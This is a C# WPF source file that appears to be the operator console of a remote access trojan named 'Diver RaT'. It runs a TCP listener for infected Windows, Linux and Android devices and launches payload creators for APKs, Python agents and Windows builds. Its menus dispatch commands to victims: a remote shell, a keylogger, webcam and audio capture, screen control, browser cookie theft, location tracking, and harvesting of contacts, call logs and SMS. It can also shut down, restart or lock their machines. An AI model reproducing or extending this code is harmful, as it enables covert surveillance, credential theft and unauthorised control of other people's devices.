using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace Diver_RaT
{
    public partial class DeviceTabContent : UserControl
    {
        private readonly ObservableCollection<Device> _devices = new();
        private TcpServer _server = null!;
        private DeviceKind _kind;
        private int _port;

        public DeviceTabContent()
        {
            InitializeComponent();
            DeviceGrid.ItemsSource = _devices;
        }

        public void Initialize(int port, DeviceKind kind)
        {
            _port = port;
            _kind = kind;
            _server = new TcpServer(port);
            DeviceGrid.ContextMenu = BuildContextMenu();
            UpdateCounters();

            if (kind == DeviceKind.Android)
            {
                PayloadButton.Content = "\u26a1  APK Creator";
                EmptyIcon.Text = "\U0001f4f1";
                EmptyTitle.Text = "No Android devices connected";
                EmptyHint.Text = "Generate an APK with the APK Creator, install it on an Android device, and it will appear here.";
            }
            else if (kind == DeviceKind.Linux)
            {
                PayloadButton.Content = "\u26a1  Script Creator";
                EmptyIcon.Text = "\U0001f427";
                EmptyTitle.Text = "No Linux agents connected";
                EmptyHint.Text = "Generate a Python 3 agent with the Script Creator, run it on a Linux machine, and it will appear here.";
            }

            StartServer();
        }

        public void RestartListener(int newPort)
        {
            try { _server.Stop(); } catch { }
            _devices.Clear();
            _port = newPort;
            _server = new TcpServer(newPort);
            DeviceGrid.ContextMenu = BuildContextMenu();
            UpdateCounters();
            EmptyState.Visibility = Visibility.Visible;
            StartServer();
        }

        private ContextMenu BuildContextMenu()
        {
            var menu = new ContextMenu();

            void Add(string header, string tag)
            {
                var mi = new MenuItem
                {
                    Header = header,
                    Tag = tag
                };
                mi.Click += MenuCommand_Click;
                menu.Items.Add(mi);
            }

            void Separator() => menu.Items.Add(new Separator());

            if (_kind == DeviceKind.Android)
            {
                Add("File Manager", "files");
                Add("Screen Capture", "screen");
                Add("Webcam", "webcam");
                Add("System Audio", "audio");
                Add("Software Inventory", "apps");
                Add("Location", "location");
                Add("Contacts", "contacts");
                Add("Call Logs", "calls");
                Add("SMS Messages", "sms");
                Separator();
                Add("Open URL", "url");
                Add("Show Toast", "msg");
                Separator();
                Add("Copy IP Address", "copyip");
                Add("Disconnect / Remove", "remove");
            }
            else if (_kind == DeviceKind.Linux)
            {
                Add("Remote Shell", "shell");
                Add("File Manager", "files");
                Add("Screen Capture", "screen");
                Add("Process Monitor", "procs");
                Add("Software Inventory", "apps");
                Separator();
                Add("Show Message Box", "msg");
                Add("Open URL", "url");
                Add("Lock Screen", "lock");
                Add("Shutdown", "shutdown");
                Add("Restart", "restart");
                Separator();
                Add("Copy IP Address", "copyip");
                Add("Disconnect / Remove", "remove");
            }
            else
            {
                Add("Remote Shell", "shell");
                Add("File Manager", "files");
                Add("Screen Capture", "screen");
                Add("Remote Control", "remote");
                Add("Webcam", "webcam");
                Add("System Audio", "audio");
                Add("Keylogger", "keys");
                Add("Process Monitor", "procs");
                Add("Software Inventory", "apps");
                Add("Location", "location");
                Add("Browser Cookie Backup", "browsers");
                Separator();
                Add("Show Message Box", "msg");
                Add("Open URL", "url");
                Add("Lock Screen", "lock");
                Add("Shutdown", "shutdown");
                Add("Restart", "restart");
                Separator();
                Add("Copy IP Address", "copyip");
                Add("Disconnect / Remove", "remove");
            }
            return menu;
        }

        private void StartServer()
        {
            _server.Log += message =>
            {
                try
                {
                    System.IO.File.AppendAllText(@"C:\Users\aduam\AppData\Local\Temp\opencode\diver_controller.log",
                        $"[{DateTime.Now:HH:mm:ss}] {message}\n");
                }
                catch { }
                try { ServerLog?.Invoke(message); } catch { }
            };
            _server.DeviceConnected += device => Dispatcher.Invoke(() =>
            {
                var existing = _devices.FirstOrDefault(d => d.Id == device.Id);
                if (existing != null)
                {
                    existing.ComputerName = device.ComputerName;
                    existing.IpAddress = device.IpAddress;
                    existing.OS = device.OS;
                    existing.Username = device.Username;
                    existing.Country = device.Country;
                    existing.DeviceType = device.DeviceType;
                    existing.IsOnline = true;
                    existing.LastSeen = "Just now";
                    return;
                }
                _devices.Add(device);
                EmptyState.Visibility = Visibility.Collapsed;
                UpdateCounters();
            });

            _server.DeviceDisconnected += device => Dispatcher.Invoke(() =>
            {
                var existing = _devices.FirstOrDefault(d => d.Id == device.Id);
                if (existing != null)
                {
                    _devices.Remove(existing);
                    UpdateCounters();
                }
                EmptyState.Visibility = _devices.Count == 0 ? Visibility.Visible : Visibility.Collapsed;
            });

            _server.Start();
        }

        public bool IsListening => _server.IsRunning;
        public int ListenerPort => _port;

        public event Action<string>? ServerLog;

        public void UpdateCounters()
        {
            int online = 0;
            foreach (var d in _devices)
                if (d.IsOnline) online++;
            OnlineCountText.Text = $"{online} Online";
            TotalCountText.Text = $"{_devices.Count} Devices";
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e)
        {
            UpdateCounters();
        }

        private void PayloadButton_Click(object sender, RoutedEventArgs e)
        {
            Window win = _kind switch
            {
                DeviceKind.Android => new AndroidPayloadCreatorWindow(),
                DeviceKind.Linux => new LinuxPayloadCreatorWindow(),
                _ => new PayloadCreatorWindow()
            };
            win.Owner = Window.GetWindow(this);
            win.ShowDialog();
        }

        private Device? SelectedDevice() => DeviceGrid.SelectedItem as Device;

        private void MenuCommand_Click(object sender, RoutedEventArgs e)
        {
            if (sender is not MenuItem item) return;
            var device = DeviceGrid.SelectedItem as Device;
            if (device is null) return;

            string command = item.Tag?.ToString() ?? string.Empty;

            switch (command)
            {
                case "copyip":
                    Clipboard.SetText(device.IpAddress);
                    return;
                case "remove":
                    _ = _server.SendCommandAsync(device.Id, "DISCONNECT");
                    _devices.Remove(device);
                    UpdateCounters();
                    EmptyState.Visibility = _devices.Count == 0 ? Visibility.Visible : Visibility.Collapsed;
                    return;
                case "shell":
                    RemoteTerminal.Open(_server, device);
                    return;
                case "files":
                    OpenPage(new FileManagerWindow(_server, device));
                    return;
                case "screen":
                    if (_kind == DeviceKind.Android) OpenPage(new ScreenCaptureMobileWindow(_server, device));
                    else OpenPage(new ScreenCaptureWindow(_server, device));
                    return;
                case "remote":
                    OpenPage(new RemoteControlWindow(_server, device));
                    return;
                case "webcam":
                    OpenPage(new WebcamWindow(_server, device));
                    return;
                case "audio":
                    OpenPage(new AudioWindow(_server, device));
                    return;
                case "keys":
                    OpenPage(new KeyloggerWindow(_server, device));
                    return;
                case "procs":
                    OpenPage(new ProcessWindow(_server, device));
                    return;
                case "apps":
                    OpenPage(new SoftwareWindow(_server, device));
                    return;
                case "location":
                    OpenPage(new LocationWindow(_server, device));
                    return;
                case "contacts":
                    OpenPage(new ContactsWindow(_server, device));
                    return;
                case "calls":
                    OpenPage(new CallLogsWindow(_server, device));
                    return;
                case "sms":
                    OpenPage(new SmsWindow(_server, device));
                    return;
                case "browsers":
                    OpenPage(new BrowserWindow(_server, device));
                    return;
                case "msg":
                    var msgPrompt = new InputPromptWindow("Show Message Box",
                        $"Message to display on {device.ComputerName}:", "Hello from Diver RaT")
                    { Owner = Window.GetWindow(this) };
                    if (msgPrompt.ShowDialog() != true || string.IsNullOrWhiteSpace(msgPrompt.Value)) return;
                    _ = RunCommandAsync(device, "MESSAGE_BOX", new Dictionary<string, string>
                    {
                        ["text"] = msgPrompt.Value,
                        ["title"] = "Diver RaT"
                    });
                    return;
                case "url":
                    var urlPrompt = new InputPromptWindow("Open URL",
                        $"URL to open on {device.ComputerName}:", "https://example.com")
                    { Owner = Window.GetWindow(this) };
                    if (urlPrompt.ShowDialog() != true || string.IsNullOrWhiteSpace(urlPrompt.Value)) return;
                    _ = RunCommandAsync(device, "OPEN_URL", new Dictionary<string, string>
                    {
                        ["url"] = urlPrompt.Value
                    });
                    return;
                case "lock":
                    if (ConfirmAction(device, "Lock Screen", "Lock the screen on this machine?"))
                        _ = RunCommandAsync(device, "LOCK_SCREEN");
                    return;
                case "shutdown":
                    if (ConfirmAction(device, "Shutdown", "Shut down this machine in 5 seconds?"))
                        _ = RunCommandAsync(device, "SHUTDOWN");
                    return;
                case "restart":
                    if (ConfirmAction(device, "Restart", "Restart this machine in 5 seconds?"))
                        _ = RunCommandAsync(device, "RESTART");
                    return;
                default:
                    _ = RunCommandAsync(device, command.ToUpperInvariant());
                    return;
            }
        }

        private bool ConfirmAction(Device device, string action, string message)
        {
            return MessageBox.Show(
                $"{message}\n\n{device.ComputerName} ({device.IpAddress})",
                $"Diver RaT - {action}",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning) == MessageBoxResult.Yes;
        }

        private void OpenPage(Window page)
        {
            page.Owner = Window.GetWindow(this);
            page.Show();
        }

        private async Task RunCommandAsync(Device device, string command, Dictionary<string, string>? args = null)
        {
            await _server.SendCommandAsync(device.Id, command, args);
        }

        private void DeviceGrid_ContextMenuOpening(object sender, ContextMenuEventArgs e)
        {
            if (e.OriginalSource is not DependencyObject source) return;
            var row = FindVisualParent<DataGridRow>(source);
            if (row?.Item is Device device)
                DeviceGrid.SelectedItem = device;
        }

        private static T? FindVisualParent<T>(DependencyObject? child) where T : DependencyObject
        {
            while (child is not null)
            {
                if (child is T match) return match;
                child = VisualTreeHelper.GetParent(child);
            }
            return null;
        }
    }

    public enum DeviceKind
    {
        Windows,
        Android,
        Linux
    }
}